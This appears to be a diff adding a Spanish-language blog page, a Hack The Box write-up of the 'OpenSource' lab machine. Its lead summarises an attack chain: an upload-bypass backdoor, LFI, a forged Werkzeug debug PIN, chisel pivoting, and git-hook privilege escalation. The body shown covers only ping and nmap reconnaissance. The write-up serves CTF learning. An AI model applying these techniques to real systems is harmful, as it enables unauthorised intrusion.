@@ -1,0 +1,1832 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OpenSource - Hack The Box · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/htb-writeup-opensource/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="OpenSource - Hack The Box">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/htb-writeup-opensource/OpenSource.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-manager/">
+          <span class="side-post-card-title">Manager</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-forest/">
+          <span class="side-post-card-title">Forest</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">OpenSource</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-scrambled/">
+          <span class="side-post-card-title">Scrambled</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-write-up-support/">
+          <span class="side-post-card-title">Support</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">HackTheBox / Easy Machine</div>
+    
+    <h1>OpenSource - Hack The Box</h1>
+    <div class="post-meta">8 October 2024 · 27 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/htb-writeup-opensource/OpenSource.png" alt="OpenSource - Hack The Box">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina que para nada es fácil; hubo que hacer bastante investigación. Empezamos enumerando la página web, aquí encontramos que podemos subir archivos y luego visitarlos, y también podemos descargar un archivo ZIP que contiene un repositorio de Git que es igual a la página web. Nos aprovechamos de tener los archivos de la página web para descubrir una vulnerabilidad en su sanitización de archivos, lo que nos permite suplantar cualquier archivo existente de la página web. Además, descubrimos unas credenciales de un usuario al enumerar el repositorio de Git, encontrándolas en una rama anterior. Sabiendo esto, suplantamos un script que nos crea una Reverse Shell/Backdoor con la que podemos obtener una shell cada vez que lo visitemos. Haciendo más pruebas a la sanitización, descubrimos que es posible aplicar LFI, que esto nos ayuda más adelante. Aplicando Fuzzing, descubrimos una consola de Flask que sirve para debuggear errores, siendo necesario un PIN para su acceso, copiamos el proceso que crea esos PIN usando un script de HackTricks con el cual nos genera un PIN estático que nos da acceso a la consola, esto lo logramos gracias al LFI descubierto, siendo otra forma con la que podemos obtener una shell. Dentro del contenedor de docker, descubrimos un puerto que al aplicar pivoting con chisel, encontramos que es el software Gitea, aquí probamos las credenciales que encontramos en el repositorio de Git y ganamos acceso, encontrando aquí un Backup que guarda las llaves del servicio SSH, así ganamos acceso a este servicio. Al final, usamos pspy para descubrir tareas CRON en uso, encontrando una que está relacionada con un repositorio Git del usuario actual, investigamos este repositorio y descubrimos que ocupa Hooks para su funcionamiento, aprovechándonos de esto, creamos un Hook que cambia los permisos de la Bash y nos permite escalar privilegios para ser el usuario Root.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>wappalizer</code></li><li><code>whatweb</code></li><li><code>echo</code></li><li><code>7z</code></li><li><code>gunzip</code></li><li><code>python3</code></li><li><code>BurpSuite</code></li><li><code>wfuzz</code></li><li><code>gobuster</code></li><li><code>git</code></li><li><code>ssh</code></li><li><code>nc</code></li><li><code>curl</code></li><li><code>python</code></li><li><code>chmod</code></li><li><code>chisel</code></li><li><code>lsof</code></li><li><code>sudo</code></li><li><code>id</code></li><li><code>uname</code></li><li><code>wget</code></li><li><code>pspy64</code></li><li><code>bash</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#zip">Analizando Contenido de Archivo ZIP</a></li>
+        <li><a href="#PoC">Prueba de Concepto de Sanitización con BurpSuite</a></li>
+        <li><a href="#Fuzz">Fuzzing</a></li>
+        <li><a href="#git">Enumeración de Git</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#suplantacion">Suplantando Script views.py de la Página Web para Generar una Backdoor</a></li>
+        <li><a href="#LFI">Aplicando Local File Inclusion</a></li>
+        <li><a href="#pin">Ganando Acceso a la Consola de Flask Copiando el Proceso de Generación de PIN de Werkzeug</a></li>
+        <li><a href="#docker">Enumeración de Contenedor Docker y Utilizando Chisel</a></li>
+        <li><a href="#ssh">Obteniendo Llave Privada y Entrando a Servicio SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#enum">Enumeración de Servicio SSH</a></li>
+        <li><a href="#hooks">Abusando de Git Hooks para Escalar Privilegios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#zip">Analizando Contenido de Archivo ZIP</a></li>
+        <li><a href="#PoC">Prueba de Concepto de Sanitización con BurpSuite</a></li>
+        <li><a href="#Fuzz">Fuzzing</a></li>
+        <li><a href="#git">Enumeración de Git</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#suplantacion">Suplantando Script views.py de la Página Web para Generar una Backdoor</a></li>
+        <li><a href="#LFI">Aplicando Local File Inclusion</a></li>
+        <li><a href="#pin">Ganando Acceso a la Consola de Flask Copiando el Proceso de Generación de PIN de Werkzeug</a></li>
+        <li><a href="#docker">Enumeración de Contenedor Docker y Utilizando Chisel</a></li>
+        <li><a href="#ssh">Obteniendo Llave Privada y Entrando a Servicio SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#enum">Enumeración de Servicio SSH</a></li>
+        <li><a href="#hooks">Abusando de Git Hooks para Escalar Privilegios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 10.10.11.164
+</span></span><span style="display:flex;"><span>PING 10.10.11.164 <span style="color:#f92672">(</span>10.10.11.164<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.11.164: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">102</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.11.164: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span>88.7 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.11.164: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span>77.0 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.11.164: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span>88.9 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 10.10.11.164 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3008ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 76.989/89.215/102.273/8.949 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Linux</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.10.11.164 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-07 12:35 CST
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 12:35
+</span></span><span style="display:flex;"><span>Scanning 10.10.11.164 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.11.164
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.11.164
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 12:35, 24.70s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.164
+</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.30s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2024-10-07 12:35:32 CST <span style="color:#66d9ef">for</span> 25s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">36309</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>, <span style="color:#ae81ff">29224</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">62</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 24.94 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">120462</span> <span style="color:#f92672">(</span>5.300MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">29925</span> <span style="color:#f92672">(</span>1.197MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Solamente vemos 2 puertos abierto. Veamos que información podemos obtener de estos dos.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 22,80 10.10.11.164 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-07 12:36 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.164
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.11s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Werkzeug/2.1.2 Python/3.10.3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: upcloud - Upload files <span style="color:#66d9ef">for</span> Free!
+</span></span><span style="display:flex;"><span>|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>|     Server: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span style="display:flex;"><span>|     Date: Mon, <span style="color:#ae81ff">07</span> Oct <span style="color:#ae81ff">2024</span> 18:36:36 GMT
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">5316</span>
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;upcloud - Upload files <span style="color:#66d9ef">for</span> Free!&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/jquery/jquery-3.4.1.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/popper/popper.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/bootstrap/js/bootstrap.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/js/ie10-viewport-bug-workaround.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/bootstrap/css/bootstrap.css&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; /static/vendor/bootstrap/css/bootstrap-grid.css&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; /static/vendor/bootstrap/css/bootstrap-reboot.css&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   HTTPOptions: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>|     Server: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span style="display:flex;"><span>|     Date: Mon, <span style="color:#ae81ff">07</span> Oct <span style="color:#ae81ff">2024</span> 18:36:36 GMT
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Allow: OPTIONS, GET, HEAD
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|   RTSPRequest: 
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
+</span></span><span style="display:flex;"><span>|     <span style="color:#e6db74">&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html;charset=utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Error response&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;body&gt;
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Error response&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Message: Bad request version <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;RTSP/1.0&#39;</span><span style="color:#f92672">)</span>.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/body&gt;
+</span></span><span style="display:flex;"><span>|_    &lt;/html&gt;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port80-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/7%Time<span style="color:#f92672">=</span>67042A2D%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>G
+</span></span><span style="display:flex;"><span>SF:etRequest,1573,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20Python/3\.10\.3\r\nDate:\x20Mon,\x2007\x20Oct\x202024\x2018:36:36\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x205316\r\nConnection:\x20close\r\n\r\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20&lt;meta\x20charset=\&#34;UTF-8\&#34;&gt;\n\x20\x20\x20\x20&lt;meta\x20na
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:me=\&#34;viewport\&#34;\x20content=\&#34;width=device-width,\x20initial-scale=1\.0\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;title&gt;upcloud<span style="color:#ae81ff">\x</span>20-<span style="color:#ae81ff">\x</span>20Upload<span style="color:#ae81ff">\x</span>20files<span style="color:#ae81ff">\x</span>20for<span style="color:#ae81ff">\x</span>20Fr
+</span></span><span style="display:flex;"><span>SF:ee!&lt;/title&gt;<span style="color:#ae81ff">\n\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;script<span style="color:#ae81ff">\x</span>20src<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/static/vendor/jquery/j
+</span></span><span style="display:flex;"><span>SF:query-3<span style="color:#ae81ff">\.</span>4<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\.</span>min<span style="color:#ae81ff">\.</span>js<span style="color:#ae81ff">\&#34;</span>&gt;&lt;/script&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;script<span style="color:#ae81ff">\x</span>20src<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/s
